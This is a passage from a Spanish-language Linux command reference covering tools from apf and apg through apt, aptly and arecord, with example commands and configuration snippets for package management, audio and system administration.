	IG_ICMP_TYPES="3,5,11" 3 Puertos ICMP permitidos [si existen]
Otros archivos importantes:
/etc/apf/deny_host.rules (ips, rangos, etc denegados)
/etc/apf/allow_host.rules (ips, rangos, etc permitidos)
/var/log/apf_log (Archivo de logs)
# apf -s (arrancar)
# apf -r (reiniciar)
# apf -f (parar)


apg
Generador de contraseñas aleatorias.
$ apg -a 1 -n 8 -m 10 (Incluyendo signos, 8 propuestas de 10 caracteres)
Algunas opciones:
	-a 0  (sin signos especiales [por defecto])
	-m 10 (número mínimo de caracteres [8 por defecto])
	-x 12 (número máximo de caracteres [10 por defecto])
	-M S  (Incluyendo un signo)
	-M N  (Incluyendo un número)
	-M C  (Incluyendo mayúsculas)
	-E aeiou9 (Excluyendo letras y números mencionados)


apitrace
es un conjunto de herramientas para depurar aplicaciones y controladores OpenGL. Incluye una herramienta para generar un seguimiento de todas las llamadas OpenGL que realiza una aplicación y una herramienta para reproducir estos seguimientos e inspeccionar la representación y el estado de OpenGL durante la ejecución del programa. Incluye las herramientas eglretrace, glretrace y gltrim
$ apitrace trace -o aplicacion.trace brave-browser (crea un archivo aplicacion.trace que contiene las llamadas de OpenGL que realiza la aplicación brave-browser)
$ glretrace aplicacion.trace (ejecuta la traza grabada y muestra visualmente cómo se renderiza en la pantalla)
            /opt/brave.com/brave/brave
            Rendered 0 frames in 0.0115168 secs, average of 0 fps
$ gltrim -o aplicacion_trim.trace aplicacion.trace (elimina llamadas redundantes de aplicacion.trace, generando una traza más optimizada [aplicacion_trim.trace], que es útil para analizar solo los eventos gráficos esenciales)
$ apitrace dump mi_aplicacion.trace (muestra detalles sobre cada llamada en la traza, lo cual es útil para el análisis de rendimiento y depuración)
$ apitrace info aplicacion.trace (muestra información de los archivos de traza)


apkinfo
Herramienta que muestra información de metadatos sobre archivos APK de Android tales como información de paquete, versión y nombre.
$ apkinfo miapp.apk (mostrar información general sobre un archivo)
$ apkinfo --package miapp.apk (ver solo el nombre del paquete)
$ apkinfo --version miapp.apk (ver solo la versión)
$ apkinfo --permissions miapp.apk (ver los permisos solicitados por el paquete)
$ apkinfo --manifest miapp.apk (ver el contenido del AndroidManifest.xml)
$ apkinfo --all miapp.apk (obtener una vista completa de la información disponible incluyendo actividades, servicios, componentes, recursos, etc)


aplay
Relacionado con ALSA
# aplay /usr/share/sounds/alsa/Front_Center.wav  (prueba de alsa)
# aplaymidi -l   (lista los puertos midi)
$ aplay -l (saber el modelo de la tarjeta de sonido)
# aplaymidi -p 65 archivo.mid  (reproduce el mid sin timidity)
# aplay -fdat /dev/sda  (Escuchar el sonido del disco duro)


aplaymidi
Utilidad de línea de comandos que reproduce los archivos MIDI especificados en uno o más puertos del secuenciador ALSA
$ aplaymidi -l (imprime una lista de posibles puertos de salida)
$ aplaymidi -p 14:0 archivo.mid


apparix
Permite marcar directorios y luego saltar a ellos usando la marca. Por defecto apparix actúa como sustituto de cd y puede ser usado de la misma manera.
$ apparix
[apparix] created bookmark file /home/pep/.apparixrc
[apparix] created expansion file /home/pep/.apparixexpand
$ apparix --shell-examples (muestra el código que ha entrarse en .bashrc para que los atajos "to" y "bm" tengan efecto)
Ejemplo:
  $ cd Documentos/bash
  [~/Documentos/bash]$ apparix --add-mark bash (añadir directorio un marcador "bash" en bookmarks.)
$ apparix -l (ver listados de los directorios guardados para un acceso rápido)
$ apparix -u 3 (eliminar del listado el número 3)


apparmor
Módulo de seguridad del kernel. Los perfiles estan: /etc/apparmor.d/
# apparmor_status (Ver estado)
# aa-complain /etc/apparmor.d/* (Activar todos los perfiles en modo complain, es decir, que no se bloquea ninguna aplicación y sólo registra sus eventos)
# aa-complain /usr/bin/firefox (Lo mismo activandolo para una aplicación)
# aa-genprof /usr/bin/firefox (Crear un perfil para una aplicación. Preguntará unos datos. Sin cerrar la terminal, abrir firefox y usar la aplicación como normalmente se usa. Al rato, volver a la terminal y pulsar "S". Se mostrará todos los ficheros a los cuales firefox ha accedido solicitando qué acción llevar a cabo)
# cat /etc/apparmor.d/usr.lib.firefox-3.0.10.firefox.sh (Consultar el perfil creado. Substituir versión por la correcta)
# apparmor_parser -R < /etc/apparmor.d/usr.lib.firefox-3.0.10.firefox.sh (Desactivar restricciones a un perfil)


apport
Herramienta encargada de capturar cualquier error que se produzca en una aplicación y recopilar información sobre el estado del sistema operativo en el momento de producirse el fallo. Para desactivarlo:
# nano /etc/default/apport
enable=0
También:
# service apport start forse_start=0
Para activarlo substituir el 0 por un 1


appres
El programa appres imprime los recursos vistos por una aplicación (o subjerarquía de una aplicación) con los nombres de clase e instancia especificados. Puede  para determinar qué recursos cargará un programa concreto. Por ejemplo
$ appres tty
$ appres  XTerm.VT100  xterm.vt100  -1 (listará los recursos de los widgets de la jerarquía xman topBox específicos de la jerarquía [-1])


apprise
Permite enviar notificaciones a más de 70 servicios. Con énfasis en: Apprise API, AWS SES, Telegram, Discord, Slack,amazon SNS, Gotify, Google Chat, Faast, IFTTT, Matrix, Microsoft Teams, etc. Hay un pequeño Administrador de configuración integrado al que se puede acceder opcionalmente a través de su navegador web, lo que le permite crear y guardar tantas configuraciones como desee. Cada configuración se diferencia por una {KEY} única que usted decide.
$ apprise -t "Título de la Notificación" -b "Este es el mensaje de la notificación" slack://TOKEN_DE_AUTENTICACION/CANAL (envía una notificación a Slack usando el TOKEN_DE_AUTENTICACION y el canal especificado)
$ apprise -t "Aviso Importante" -b "Este es el mensaje enviado a múltiples servicios" \
    tgram://TOKEN/CHAT_ID \
    discord://WEBHOOK_ID/WEBHOOK_TOKEN (enviará el mensaje a ambos servicios de notificación)
$ apprise -t "Notificación desde archivo" -b "Este mensaje usa una configuración externa" --config archivo_config.yml (configurar varios servicios en un archivo y luego utilizarlo para enviar notificaciones de manera centralizada)
Nota.- el archivo archivo_config.yml contiene las URL de los servicios configurados
$ apprise -t "Prueba de Notificación" -b "Este es un mensaje de prueba" -v (muestra información detallada del proceso de envío y si los servicios están configurados correctamente)


approx
Proxy de paquetes para sistemas Debian que ayuda a almacenar en caché los paquetes .deb, lo cual ahorra ancho de banda y reduce los tiempos de descarga al instalar o actualizar en múltiples máquinas dentro de una red local.  Cada paquete se descarga desde un sitio remoto solo una vez, independientemente de cuántos clientes locales lo instalen. Las ubicaciones de los repositorios solo deben cambiarse en el archivo de configuración de approx, no en el archivo /etc/apt/sources.list de cada cliente. Primero configurar el servidor approx:
# nano /etc/approx/approx.conf
Y añadir las lineas deseadas. Cada línea en este archivo indica un alias para un repositorio.
         debian   http://deb.debian.org/debian
         security http://security.debian.org/debian-security
         max_age 30d
En este caso, debian y security son alias que apuntan a los repositorios oficiales. approx almacenará en caché los paquetes que se descarguen desde estos alias. La linea "max_age" es para hacer que los paquetes caduquen en 30 días.
# systemctl start approx (iniciar el servicio)
# systemctl status approx (confirmar si está activo)
Después en cada máquina cliente de la red, se modifica el archivo /etc/apt/sources.list para que apunte al servidor approx. Por ejemplo si el servidor proxy tiene la IP 192.168.1.100, el archivo podría verse así:
        deb http://192.168.1.100:9999/debian stable main
        deb http://192.168.1.100:9999/security stable/updates main
Ahora, cada vez que se descarguen paquetes desde este cliente, approx almacenará los paquetes en caché en el servidor.
# approx-gc (elimina los paquetes que ya no son necesarios)
# tail -f /var/log/approx.log (ver los registros de actividad)


appstream
Permite obtener información detallada de componentes de software. El proyecto AppStream proporciona facilidades para acceder y transformar fácilmente estos metadatos, así como algunos servicios adicionales para permitir la creación de centros de software con numerosas funciones y aplicaciones similares. Este paquete proporciona herramientas para generar, mantener y consultar el conjunto de datos de AppStream del software instalado y disponible, y permite la integración con el administrador de paquetes APT.
$ appstreamcli search firefox (buscar información sobre un paquete)
$ appstreamcli search firefox --details (salida más detallada sobre firefox)
# appstreamcli refresh (refescar la memoria de los metadatos actuales)
$ appstreamcli status (información del estado de todos los metadatos disponibles)


appstream-util
# appstream-util add-language es /mi_app.appdata.xml (con un archivo AppStream [.appdata.xml] agregar una nueva traducción de idioma [es] en el archivo especificado)
# appstream-util appdata-to-news /mi_app.appdata.xml (genera un archivo de noticias a partir de las versiones y las notas especificadas en el archivo AppStream)
# appstream-util dump /mi_app.appdata.xml (desglosa la estructura del archivo, mostrando campos como nombre, descripción, licencias y versiones)
# appstream-util validate /mi_app.appdata.xml (muestra advertencias o errores si el archivo no cumple con las especificaciones necesarias)
# appstream-util list-languages /mi_app.appdata.xml (lista los idiomas integrados en el archivo)


apropos
Busca utilidades relacionadas con lo especificado.
$ apropos jpeg
$ apropos “copy files”  (busca comandos relacionados)


apsfilter
Facilita la impresión de muchos formatos de archivo [gzip, bzip2, html, tiff, pdf, ascii, jpeg...]. Incluye las herramientas aps2file, apsfilter-bug, apspreview y apsfilterconfig.
# apsfilterconfig (abre el asistente que permite seleccionar el tipo de impresora, configurar los controladores y ajustar opciones como el tamaño del papel y la resolución)
# aps2file archivo.ps salida (convierte archivo.ps en el formato de salida especificado y lo guarda como salida)
# apspreview archivo.ps (vista previa, mostrando el archivo como se verá impreso)
# apsfilter-bug (inicia un asistente que recopila información sobre el sistema y ayuda a generar un informe detallado del problema para ser enviado a los desarrolladores)


apt
Aplicación que unifica las opciones y parámetros de apt-cache y apt-get. Tambien cuenta con una barra de progreso. Tiene casi los mismo parametros que el comando apt-get.
# apt list (Muestra todos los paquetes disponibles)
# apt list --installed (Muestra todos los paquetes instalados)
# apt list --upgradable (Muestra todos los paquetes actualizables)
$ apt search paquete (Buscar un paquete)
# apt update (Actualiza el listado de paquetes)
# apt upgrade (Actualiza todos los paquetes del sistema. No elimina ninguno)
# apt dist-upgrade (Lo mismo pero si que elimina de forma inteligente)
# apt install paquete (Instala un paquete)
# apt install -f (Intenta corregir problemas como paquetes rotos y otros problemas de dependencias)
# apt install -f -o Dpkg::Options::="--force-overwrite" (Lo mismo que el anterior pero le indicamos a dpkg que sobreescriba ficheros que más de un paquete pretenden instalar)
# apt remove paquete (Suprime un paquete)
# apt edit-sources (Edita el sources.list)
# apt show nano (ver detalles de un paquete)
1- significado de algunas salidas de apt update
   Hit (significa que apt comprobó las marcas de tiempo en la lista de paquetes, éstas coinciden y no hay cambios.)
   Ign (significa que no hay cambios en el archivo de índice pdiff, no se molestará en descargarlo de nuevo.)
   Obj (en la versión del paquete no hay cambios respecto a la versión anterior)
   Get (hubo cambios y se descargarán.)


apt-cdrom
Agregar un cd-rom archivo sources.list.
# apt-cdrom -d /home/user/mycdrom add


apt-cache
Empleado para buscar en la base de datos provista por la lista de fuentes [dpkg solo busca los contenidos de los paquetes instalados].
# apt-cache search paquete       (Busca en la cache paquete)
# apt-cache show paquete         (Muestra la descripción completa del paquete)
# apt-cache showpkg paquete   (Muestra su relación con otros paquetes)
# apt-cache depends paquete    (Muestra las dependencias del paquete)
# apt-cache rdepend paquete     (Muestra dependencias inversas del paquete)
# apt-cache policy paquete       (Ver vesiones de paquetes y la versión instalada)


apt-clone
Este paquete clona/restaura los paquetes instalados en un sistema por apt con el sources-list y las claves de los repositorios.
# apt-clone clone paquetes (los guarda en el archivo paquetes)
# apt-clone info paquetes (mostrar información sobre el archivo creado)
# apt-clone restore paquetes (restaurar los paquetes)


apt-config
Programa interno utilizado por varias partes de la suite APT para proporcionar una configurabilidad consistente. Accede al archivo de configuración principal /etc/apt/apt.conf de forma que sea fácil de usar por aplicaciones con scripts.
# apt-config dump (muestra la configuración establecida)


apt-config-auto-update
Permite que APT está configurado para actualizar la caché de forma automática. Esto significa que, cada vez que se instala o actualiza un paquete, APT verificará la disponibilidad de nuevas versiones sin tener que actualizar manualmente la caché con comandos como apt update. Este paquete no tiene un comando ejecutable como tal. Su función es mantener la caché de APT actualizada automáticamente. Genera archivos de configuración en [los comentarios son mios]:
# nano nano /etc/apt/apt.conf.d/20auto-upgrades
  # Asegura que las listas de paquetes se actualicen regularmente:
  APT::Periodic::Update-Package-Lists "1";
  # Que se instalen automáticamente las actualizaciones disponibles y los parches de seguridad críticos:
  APT::Periodic::Unattended-Upgrade "1";


apt-dater
Forma fácil para administrar actualizaciones de paquetes en una gran cantidad de hosts remotos mediante SSH y apt-dater-host. Incluye la apalicación adsh que es un programa auxiliar interno para apt-dater y no está destinado a utilizarse. Antes de usar, es necesario configurarlo correctamente:
# ssh-keygen -t rsa -b 4096 -C "tu_email@example.com" (generar clave SSH en el servidor)
# ssh-copy-id -i ~/.ssh/apt-dater usuario@host1 (distribuir la clave pública a los hosts que se desean gestionar)
# ssh-copy-id -i ~/.ssh/apt-dater usuario@host2
En cada host, crear un usuario específico para las actualizaciones:
# nano /etc/sudoers
Y añadir la linea:
  USER ALL=(ALL) NOPASSWD: /usr/bin/apt-get, /usr/bin/needrestart
Crear archivos de configuración: ~/.config/apt-dater/apt-dater.conf, ~/.config/apt-dater/hosts.conf (contiene todos los hosts que se desea administrar) y ~/.config/apt-dater/screenrc
$ apt-dater (actualizar todos los hosts. iniciará sesión en los hosts especificados y ejecutará "apt-get update" y "apt-get upgrade" en cada uno de ellos)
$ apt-dater --auto-refresh (actualizar solo los paquetes necesarios)
$ apt-dater -r (crear un informe XML de la última actualización)
$ apt-dater -n -r (evitar que se refresquen los hosts antes de crear el informe XML)
Configuración avanzada:
$ ~/.config/apt-dater/apt-dater.conf
...
[Paths]
HostsFile=$XDG_CONFIG_HOME/apt-dater/hosts.conf
StatsDir=$XDG_DATA_HOME/apt-dater
[SSH]
Cmd=/usr/bin/ssh
SpawnAgent=true
AddKeys=~/.ssh/apt-dater
[Commands]
CmdRefresh=apt-dater-host refresh
CmdUpgrade=apt-dater-host upgrade
CmdInstall=apt-dater-host install %s
...


apt-doc
Muestra información sobre el comando apt. Colocar en el navegador: usr/share/doc/apt-doc/guide.es.html


apt-extracttemplates
[apt-utils]. Toma un paquete Debian como entrada y escribirá en un directorio temporal o en el especificado con -t, los scripts de configuración y archivos de plantilla asociados. Para cada paquete aprobado que contenga scripts de configuración y plantillas, se generará una línea de salida en el formato: package, version, template-file y config-script.
$ apt-extracttemplates cups_2.2.1-8+deb9u5_amd64.deb
cups 2.2.10-6+deb10u3 /tmp/user/1000/cups.template.3UbTXr /tmp/user/1000/cups.config.HtrJO2


apt-fast
[axel o aria]. Paquete que incrementa la velocidad de descarga de paquetes respecto de apt-get mediante el uso de axel [ver] o aria. Descargar el scrpt de http://www.mattparnell.com/linux/apt-fast/apt-fast.sh o via github de https://github.com/ilikenwf/apt-fast. Para reconfigurar el paquete:
# dpkg-reconfigure apt-fast
Donde se podrá apreciar su velocidad es principalmente con los argumentos "update", "upgrade" y "dist-upgrade".
# apt-fast update


apt-file
Buscar un paquete que contiene un fichero o ver el contenido de un paquete. Una vez instalado, para realizar la caché,  lanzar en primer lugar:
# apt-file update
# apt-file search ifconfig
# apt-file list ifconfig


apt-ftparchive
Genera ficheros de índice de paquetes .deb
$ apt-ftparchive contents /var/cache/apt/archives/python* (genera un fichero de contenidos a partir del directorio especificado)
$ apt-ftparchive packages directorio | gzip > Packages.gz (crear un fichero «Packages» comprimido para un directorio que contenga paquetes deb)


apt-get
[aptitude y apt-cache]. Gestor de programario de distribuciones Debian. Listtado del historial de instalaciones y desinstalaciones en /var/log/apt/history.log
# apt-get update    (Actualiza la lista de paquetes)
# apt-get upgrade   (Actualiza todos los paquetes instalados)
# apt-get upgrade paquete     (Solo actualiza “paquete”)
# apt-get dist-upgrade    (Actualiza la distribución)
# apt-get install paquete (Instala paquetes con resolución de depencias)
# apt-get install paquete -y (instalar paquete sin pedir confirmación)
# apt-get install --reinstall  paquete      (Reinstala un paquete)
# apt-get install --only-upgrade firefox-esr (actualiza un solo paquete)
# apt-get autoremove  (Borra paquetes huérfanos)
# apt-get download paquete (descarga el deb del paquete especificado)
# apt-get remove paquete        (Elimina un paquete)
# apt-get remove --purge paquete  (Desinstala con archivos de configuración)
# apt-get remove $(deborphan)  (Elimina huerfanos. lanzar varias veces)
# apt-get clean        (Elimina caché)
# apt-get autoclean  (lo mismo de versiones antiguas de paquetes)
# apt-get -f install   (sin especificar paquete, para reparar la aplicación)
# apt-get -s install paquete        (simula la instalación)
# apt-get --compile source paquete  (baja las fuentes, compila y crear un .deb)
# apt-get check          (Verifica dependencias rotas)
# apt-get build-dep paquete (instalar las dependencias necesarias para poder compilar un paquete fuente)
# apt-get install network-manager=0.9.1.90-0ubuntu3 (version concreta)
# apt-mark hold network-manager (Mantener una version concreta)
# apt-get source paquete (buscar un paquete fuente para ser compilado)
# apt-rdepends paquete (muestra todas las dependencias)
# apt-rdepends -b paquete (muestra las dependencias directas)
# apt-rdepends -f paquete  (muestra version y estado del paquete)
# apt-get --yes install paquete (Responder “si” a preguntas de la instalación)
# aptitude search ~ilinux-image (Lista los kernels instalados)
# aptitude search ~i -F %p (Lista los paquetes instalados)
# apt-setup                              (Crea un sources.list optimizado)
# add-apt-repository ppa:repositorio   (añadir un repositorio ppa)
# ppa-purge ppa:repositorio   (suprimirlo. Precisa el script ppa-purge))
# apt-get install --no-install-recommends paquete (No instalar los paquetes recomendados que no sean dependencias fuertes)
Algunos archivos relacionados:
	/etc/apt/sources.list (Fichero de repositorios.)
	/var/cache/apt/archives (Caché de los paquetes .deb instalados)
	/var/log/apt/term.log (Archivo de logs de la aplicación)
1.-
Para resolver problemas con  /var/lib/apt/lists/*  lanzar:
# rm /var/lib/apt/lists/* -vf
Y luego:
# apt-get update
2.-
# apt-get -o "Acquire::Check-Valid-Until=false" update   (Saltarse el validador  que verifica la fecha de caducidad del archivo “Release” de debian [Error ” Release file expired, ignoring file”])
3.-
Añadir repositorios de distintas ramas en debian.
Incluir en el sources.list los repositorios de las distintas ramas:
# nano sources.list
	## Debian Testing
	deb http://ftp.de.debian.org/debian/ testing main contrib non-free
	deb-src http://ftp.de.debian.org/debian/ testing main contrib non-free
	## seguridad Debian Testing
	deb http://security.debian.org/ testing/updates main contrib non-free
	deb-src http://security.debian.org/ testing/updates main contrib non-free
	## Debian Unstable
	deb http://ftp.us.debian.org/debian unstable main non-free contrib
	## Debian experimental
	deb http://ftp.fr.debian.org/debian experimental main non-free contrib
Editar o crear el fichero:
# nano /etc/apt/apt.conf
Con el siguiente contenido:
	APT::Default-Release “testing”;
	APT::Cache-Limit 55000000;
	Apt::Get::Purge;
	APT::Clean-Installed;
	APT::Get::Fix-Broken;
	APT::Get::Fix-Missing;
	APT::Get::Show-Upgraded “true”;
Con el que establecemos las siguientes caracteristicas: Definir Debian Testing como rama principal,Limitar la cache utilizada en el proceso de actualización,Borrar archivos de configuración de los paquetes desinstalados y Arreglar el sistema en caso de detectar dependencias rotas.
Editar el archivo preferences:
# nano /etc/apt/preferences
Con el contenido:
	Package: *
	Pin: release a=testing
	Pin-Priority: 900
	Package: *
	Pin: release a=unstable
	Pin-Priority: 600
	Package: *
	Pin: release a=experimental
	Pin-Priority: 50
Que tiene por significado que si el paquete existe en la rama testing se enstalará este, en caso contrario, si existe en unstable se instalará el unstable y sólo si no existe en las otras dos, se instalará de la versión experimental.
También podemos especificarlo en el comando:
# apt-get install libreoffice/unstable (Firefox se instalará de la rma unstable, pero las dependencias, se buscarán en primer lugar en la rama testing)
# apt-get -t unstable install firefox (Tanto firefox como las dependencias se instalarás de la rama unstable)
4.-
Instalación de aplicaciones sin conexión a internet. Ha de instalarse en dos equipos: el que tiene conexión y en el que no la tiene. Esta aplicación tiene muchas limitaciones ya que no instala dependencias por lo que puede usarse en pocos casos.
En el equipo sin conexión:
# apt-offline set apt.sig --update --upgrade --install-packages PAQUETE (genera el archivo apt.sig que ha de trasladarse al equipo que tiene conexión)
En el equipo conexión:
# apt-offline get apt.sig --threads 5 --bundle offline.zip (Crea el archivo offline.zip que se traslada al equipo sin conexión)
Otra vez en el equipo sin conexión:
# apt-offline install offline.zip
# apt-get install PAQUETE (Instalación del paquete)
5.-
Instalar aplicaciones de arquitectura 386 en equipos amd64:
# nano /etc/apt/sources.list
Añadir las lineas:
	deb http://ftp.debian.org/debian/ wheezy-updates main contrib
	deb http://http.us.debian.org/debian/ wheezy contrib non-free main
# apt-get update
# apt-get upgrade
Activar multiarquitectura:
# dpkg --add-architecture i386
# apt-get update
Instalar librerías base para los sistemas de 32 bits:
# apt-get install libc6:i386
6.-
Configurar apt para que no descargue traducciones:
# nano /etc/apt/apt.conf.d/99Translations
Con el siguiente contenido:
	Acquire::Languages "none";


apt-key
Herramienta para la gestion de un anillo de claves de repositorios seguros. El anillo de claves se guarda en el archivo /etc/apt/trusted.gpg
# apt-key list (listar todas las claves del anillo)
# apt-key net-update (Actualizar utilizando la red)
# apt-key exportall (Exportar todas las claves)
# apt-key export xxxxxx (Exportar una clave)
# apt-key del xxxxx (Eliminar una clave)


apt-listbugs
Herramienta que muestra errores críticos de los paquetes nombrados.
$ apt-listbugs list chromium


apt-listchanges
Herramienta que muestra qué ha cambiado en una nueva versión de un paquete Debian en comparación con la versión instalada en el sistema.
$ apt-listchanges -a paquete.deb


apt-listdifferences
Mostrará las diferencias o parches, entre las fuentes de todos los paquetes a medida que se actualizan. Esto hace posible revisar fácilmente los cambios de origen que se han incluido en las nuevas actualizaciones de paquetes Debian.
$ apt-listdifferences --initialize (descargar la base de datos en función de los paquetes instalados)
$ apt-listdifferences --apt (mostrar lista de paquetes, uno por línea, por pantalla)
$ apt-listdifferences firefox-esr (de la aplicación especificada)


apt-mark
Marca o desmarca un paquete como instalado automáticamente como dependencia por la instalación de otro.  ejemplo, marcar un paquete como de instalación automática o manual o cambiar las selecciones de dpkg como retener, instalar, desinstalar y purgar que son respetadas por apt-get, dselect-upgrade o aptitude.
# apk-mark hold openssl (para que no se actualice el paquete openssl)
# apk-mark unhold openssl (disponible para actualizar)
# apt-mark showhold (ver todos los paquetes que no se actualizaran)
# apt-mark manual ruby (marcar ruby para instalación manual. substituir "manual" por "auto" para volver a instalación autormática)
# apt-mark showremove (los marcados para eliminar)
# apt-mark showmanual (los marcados para instalar manualmente)


apt-mirror
[apache2]. Configurar un repositorio local. Seguidamente se muestra el proceso:
$ mkdir repo (Crear el directorio)
# nano /etc/apt/mirror.list
Añadir al principio la linea del directorio:
	set base_path /home/USER/repo
# apt-mirror (Recargar/actualizar el repositorio)
Crear el enlace para que esté disponible via web:
$ cd /var/www/html
$ ln -s /home/USER/distro/mirror/us.archive.ubunu.com/ubuntu ubuntu
Modificar el sources.list:
# nano /etc/apt/sources.list
Añadir la lineas:
	deb http://192.168.1.2/ubuntu trusty universe
	deb http://192.168.1.2/ubuntu trusty main restricted
	deb http://192.168.1.2/ubuntu trusty-updates main restricted
# apt-update (Actualizar el cliente)


apt-show-source
Muestra información del paquete fuente.
# apt-show-source (de todos los instalados)
# apt-show-source -p vim (del especificado)


apt-show-versions
Analiza las versiones instaladas de paquetes y si existen actualizaciones.
$ apt-show-versions (mostrará la versión de todos los paquetes instalados)
$ apt-show-versions thunderbird (La version instalada de un paquete)
$ apt-show-versions -a thunderbird (Todas las versiones disponibles de un paquete)
$ apt-show-versions -u (sólo mostrar los paquetes que tienen nueva version)


apt-sortpkgs
Herramienta para ordenar los ficheros del índice de paquetes.
# apt-sortpkgs -s /var/lib/dpkg/available (orden por el campo de índice de fuentes)


apt-src
Herramienta en sistemas basados en Debian diseñada para trabajar con el código fuente de los paquetes. A diferencia de apt-get, que instala paquetes binarios precompilados, apt-src permite descargar, compilar, instalar, y administrar paquetes a nivel de código fuente. Para que apt-src funcione correctamente, han de tenese habilitados los repositorios de código fuente en el archivo /etc/apt/sources.list [deb-src].
# apt-src install vim (descargará el código fuente del paquete al directorio de trabajo actual, en lugar de instalar el paquete binario)
# apt-src update vim (actualizar el código fuente a la última versión disponible de un paquete ya descargado)
# apt-src build vim  (compilar el código fuente descargado)
# apt-src remove vim (desinstalar un paquete compilado usando apt-src)
# apt-src list (listar paquetes instalados mediante apt-src)
# apt-src diff (Este comando creará un archivo de parche con las diferencias entre la versión original y los cambios realizados por ti)


aptfs
Herramienta basada en FUSE que permite explorar los paquetes fuente de Debian como si fueran archivos en un sistema de archivos. Esto facilita el acceso a los archivos fuente de los paquetes directamente desde la estructura de directorios, sin necesidad de descargarlos y extraerlos manualmente.
# mkdir /mnt/aptfs (crear el directorio)
# aptfs /mnt/aptfs (montar el sistema de archivos aptfs en el directorio /mnt/aptfs, permitiendo navegar por los paquetes fuente)
        $ cd /mnt/aptfs
        $ ls (lista de directorios, cada uno representando un paquete disponible)
        $ cd /mnt/aptfs/coreutils
        $ ls (ver todos los archivos fuente del paquete coreutils disponibles en ese directorio)
        $ find /mnt/aptfs/coreutils -name "archivo.c" (buscar dentro del sistema de archivos para encontrar el archivo archivo.c)
# umount /mnt/aptfs (desmontar el sistema de archivos aptfs)


aptly
Gestión de repositorios de paquetes Debian en local.
# aptly repo create -distribution=bullseye -component=main mi-repo (crea un repositorio local mi-repo con la distribución bullseye y el componente main)
# aptly repo add mi-repo /paquete.deb (añadir paquetes .deb al repositorio mi-repo)
# aptly publish repo -architectures=amd64 i-repo (hace accesible un servidor web local en la ruta /aptly/public)
# aptly mirror create -architectures=amd64 debian-mirror http://deb.debian.org/debian bullseye main (sincronizar aptly con repositorios externos, por ejemplo, el repositorio principal de Debian)
# aptly mirror update debian-mirror (actualizar un espejo creado previamente)
# aptly repo remove mi-repo nombre-del-paquete (eliminar un paquete específico del repositorio)
# aptly snapshot export tar mi-repo /exportada/mi-repo.tar (exportar un repositorio a un archivo tar para distribuirlo)


aptly-publisher
Herramienta que complementa a aptly para automatizar la publicación y organización de repositorios Debian en entornos de producción.  Primero configurar un archivo de configuración básico para definir cómo se gestionarán los repositorios.
# nano config.yml
Y añadir las lineas:
         rootDir: /path/to/aptly/root
         publishEndpoints:
            myRepo:
                distribution: bullseye
                components:
                      - main
                architectures:
                      - amd64
         cleanupOldPublications: true
Este archivo define un punto de publicación para bullseye con el componente main y arquitectura amd64. La última linea es para eliminar publicaciones antiguas automaticamente.
# aptly-publisher -config=config.yml publish (publicar los paquetes del repositorio o actualizar un repositorio publicado para reflejar nuevos cambios)
Si se pretende publicar múltiples repositorios, en el archivo config.yml incluir las siguientes lineas:
      publishEndpoints:
        repo1:
                distribution: bullseye
                components: [main]
                architectures: [amd64]
        repo2:
                distribution: buster
                components: [main]
                architectures: [i386]
Con esta configuración, se puede gestionar y publicar los dos repositorios [repo1 y repo2] con un solo comando:
# aptly-publisher -config=config.yml publish


ar
Crea, modifica y extrae archivos.
$ ar crv libfoo.a bill.o fred.o (Añade librerias objeto a un archivo de librería estática)
$ ar vx paquete.deb (extrae un .deb convirtiendolo en un tar.gz)
$ ar x finalterm_0.1-0~64~saucy1_amd64.deb (Extraer los 3 archivos de un paquete deb)
$ ar p finalterm_0.1-0~64~saucy1_amd64.deb data.tar.gz | tar xz (Extraer y descomprimir uno de los archivos de un paquete deb)


arcanist
Herramienta para interactuar  con Phabricator, colección de aplicaciones web para el desarrollo de software, que desde el 1 de junio de 2021, ya no recibe mantenimiento activo. La herramienta permite realizar operaciones relacionadas con el flujo de trabajo de desarrollo de software, como enviar revisiones de código, actualizar revisiones y ejecutar pruebas.
$ arc diff (escanear los cambios en una rama actual y generar una revisión de código, que se sube al servidor de Phabricator y abrirá una interfaz interactiva para agregar detalles, etiquetas, etc)
$ arc diff --update D1234 (con una revisión creada y se desea actualizar con nuevos cambios adicionales a esa revisión específica)
$ arc patch D1234 (descarga y aplica los cambios de la revisión indicada (D1234) al repositorio local)
$ arc unit (ejecuta conjunto de pruebas especificado en la configuración de Phabricator para asegurarse de que los cambios no rompan nada antes de enviarlos)
$ arc lint (analiza el código y muestra recomendaciones de estilo, errores potenciales y advertencias)
$ arc help diff (mostrar auyda para un comando especifico)


arch
Muestra la arquitectura del pc.
$ arch


arch-install-scripts
Están diseñados para facilitar la instalación de sistemas Arch Linux, pero también pueden resultar útiles en sistemas Debian para gestionar particiones, formatear discos, o preparar sistemas base. Contiene los paquetes: arch-chroot,  genfstab y pacstrap
# pacstrap /mnt base (instala el sistema base de Arch Linux en /mnt)
# mount-chroot /mnt (monta las particiones y dispositivos necesarios en /mnt)
# genfstab -U /mnt >> /mnt/etc/fstab (detecta automáticamente las particiones montadas y las configura en el archivo fstab del sistema en /mnt)
# arch-chroot /mnt (permite operar dentro del entorno chroot de manera similar al comando chroot de Debian)
# arch-chroot /mnt pacman -S vim (instala vim en el entorno de Arch)


arch-test
Detectar las arquitecturas soportadas por un pc.
$ arch-test


archalien
Convierte paquetes .deb en paquetes Archlinux. Descarga de <https://github.com/Asher256/archalien>
$ python archalien.py arandr_0.1.9-1_all.deb
El resultado es un paquete con el nombre arandr-0.1.9-1.pkg.tar.gz que puede instalarse en Arch Linux con:
# pacman -U arandr-0.1.9-1.pkg.tar.gz


archivemount
Sistema de archivos basado en FUSE [Filesystem in Userspace] que permite montar archivos comprimidos tales como .zip, .tar, .rar, etc. como si fueran sistemas de archivos normales pudiendo acceder a su contenido sin descomprimirlos. Su propósito es montar archivos en un punto de montaje desde donde se puedan leer o escribir como en cualquier otro sistema de archivos.
# archivemount archivo.zip mnt/ (montar un archivo .zip en la carpeta /mnt)
# archivemount -o ro archivo.tar.gz mnt/ (montar un .tar.gz de solo lectura)
# fusermount -u mnt/ (desmontar un archivo como: umount mnt/)
# archivemount archivo.iso mnt/ (montar una .iso)
# archivemount -o attr_timeout=60 archivo.zip mnt/ (mantener en caché la información de los archivos, muy útil en archivos grandes)


arecord
[alsa-utils]. Grabación de audio. Graba directamente de la tarjeta de sonido sin tener conectado los altavoces ni micro.
$ arecord -l (Listado de dispositivos)
$ arecord -f cd -d 10 --device="hw:0,0" test.wav (seleccionar un dispositivo de entrada de audio de la lista, grabar un audio de 10 segundos y guardar en test.wav)
$ arecord archivo.mp3 (Modo básico)
